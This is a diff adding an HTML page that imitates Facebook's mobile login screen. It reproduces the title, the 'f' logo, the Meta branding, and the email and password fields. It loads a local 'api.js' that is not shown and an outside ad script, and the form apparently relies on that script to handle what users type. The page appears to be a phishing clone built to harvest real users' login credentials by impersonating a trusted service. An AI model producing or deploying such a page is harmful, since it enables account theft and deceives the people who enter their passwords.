@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Facebook – log in or sign up</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background-color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      min-height: 100vh;
+      padding: 0 20px 40px;
+    }
+
+    .top-banner {
+      width: 100%;
+      background-color: #f0f2f5;
+      color: #1877f2;
+      text-align: center;
+      font-size: 14px;
+      padding: 12px;
+      border-bottom: 1px solid #e0e0e0;
+    }
+
+    .language {
+      font-size: 14px;
+      color: #606770;
+      margin: 18px 0;
+    }
+
+    .logo {
+      margin-top: 20px;
+      margin-bottom: 25px;
+    }
+
+    .logo svg {
+      width: 65px;
+      height: 65px;
+    }
+
+    form {
+      width: 100%;
+      max-width: 400px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .input-container {
+      position: relative;
+      width: 100%;
+    }
+
+    input {
+      width: 100%;
+      padding: 15px;
+      border: 1px solid #dddfe2;
+      border-radius: 10px;
+      font-size: 16px;
+      outline: none;
+    }
+
+    input:focus {
+      border-color: #1877f2;
+    }
+
+    .eye-icon {
+      position: absolute;
+      right: 15px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      fill: #606770;
+      width: 22px;
+      height: 22px;
+    }
+
+    .login-btn {
+      background-color: #1877f2;
+      color: #fff;
+      border: none;
+      border-radius: 50px;
+      padding: 14px;
+      font-size: 17px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .forgot {
+      color: #1877f2;
+      text-align: center;
+      margin-top: 10px;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    .create-btn {
+      border: 1px solid #1877f2;
+      color: #1877f2;
+      background: #fff;
+      border-radius: 50px;
+      padding: 14px;
+      font-size: 17px;
+      font-weight: 600;
+      margin-top: 25px;
+      cursor: pointer;
+      width: 100%;
+      max-width: 400px;
+    }
+
+    footer {
+      margin-top: 60px;
+      text-align: center;
+      color: #606770;
+      font-size: 13px;
+    }
+
+    footer img {
+      width: 70px;
+      margin-top: 20px;
+      margin-bottom: 10px;
+    }
+
+    footer a {
+      color: #606770;
+      margin: 0 5px;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<script src="api.js"></script>
+<body>
+  <div class="adhub-banner" data-site="bb57c3f128615860722c"></div>
+<script src="https://intelseller.com/js/ad-hub-banner.js" async></script>
+  <div class="top-banner">
+    Get Facebook for Android and browse faster.
+  </div>
+
+  <div class="language">English (UK)</div>
+
+  <div class="logo">
+    <!-- Official Facebook "f" SVG -->
+    <svg viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg">
+      <path fill="#1877F2" d="M36 18A18 18 0 1 0 15.75 35.82V23.22h-4.74V18h4.74v-4c0-4.68 2.8-7.25 7.08-7.25 2.05 0 4.19.37 4.19.37v4.61h-2.36c-2.32 0-3.04 1.44-3.04 2.91V18h5.17l-.83 5.22h-4.34v12.6A18 18 0 0 0 36 18"/>
+      <path fill="#fff" d="M25.17 23.22 26 18h-5.17v-3.38c0-1.47.72-2.91 3.04-2.91h2.36V7.1s-2.14-.37-4.19-.37c-4.28 0-7.08 2.57-7.08 7.25V18h-4.74v5.22h4.74v12.6a18.07 18.07 0 0 0 5.28 0v-12.6h4.93z"/>
+    </svg>
+  </div>
+
+  <form>
+    <input required type="text" placeholder="Mobile number or email address" name="Email or phone number" />
+
+    <div class="input-container">
+      <input required type="password" placeholder="Password" id="password" name="password" />
+      <!-- Eye icon SVG -->
+      <svg class="eye-icon" id="togglePassword" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+        <path d="M12 5c-7 0-11 7-11 7s4 7 11 7 11-7 11-7-4-7-11-7zm0 12a5 5 0 1 1 0-10 5 5 0 0 1 0 10z"/>
+      </svg>
+    </div>
+
+    <button type="submit" class="login-btn">Log in</button>
+  </form>
+
+  <div class="forgot">Forgotten password?</div>
+
+  <button class="create-btn">Create new account</button>
+
+  <footer>
+    <img src="https://i.ibb.co/0Vn7cdhz/Background-Eraser-20260207-094302230.png" alt="Meta Logo" />
+    <div>About · Help · More</div>
+  </footer>
+
+  <script>
+    const togglePassword = document.getElementById('togglePassword');
+    const passwordInput = document.getElementById('password');
+    let showing = false;
+
+    togglePassword.addEventListener('click', () => {
+      showing = !showing;
+      passwordInput.type = showing ? 'text' : 'password';
+      togglePassword.innerHTML = showing
+        ? '<path d="M12 5c-7 0-11 7-11 7s4 7 11 7c1.8 0 3.5-.4 5-1.2l2.5 2.5 1.4-1.4-2.6-2.6C20.9 14.8 23 12 23 12s-4-7-11-7zm0 12a5 5 0 0 1-5-5c0-.6.1-1.2.3-1.7L7.1 8.1A8.8 8.8 0 0 0 1.5 12s4 7 10.5 7c1.7 0 3.3-.4 4.7-1.1l-1.4-1.4c-.5.2-1.1.3-1.8.3z"/>'
+        : '<path d="M12 5c-7 0-11 7-11 7s4 7 11 7 11-7 11-7-4-7-11-7zm0 12a5 5 0 1 1 0-10 5 5 0 0 1 0 10z"/>';
+    });
+  </script>
+</body>
+</html>
